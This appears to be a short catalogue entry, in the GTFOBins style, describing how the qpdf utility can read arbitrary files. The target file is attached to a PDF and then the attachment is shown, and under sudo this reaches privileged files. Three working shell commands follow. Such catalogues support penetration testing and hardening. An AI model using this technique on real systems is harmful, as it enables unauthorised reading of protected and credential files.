file-read.description: `qpdf` can be used to read any arbitrary file accessible to the running user, by attaching the target file to a valid PDF file, and then accessing that attachment. If the user is allowed to run `qpdf` as an elevated user (e.g with `sudo`), privileged files can be read.
file-read.code:
FILE_TO_READ="/path/to/file"
qpdf --qdf --add-attachment $FILE_TO_READ --key=anykey -- valid.pdf output.pdf
qpdf --show-attachment=anykey output.pdf
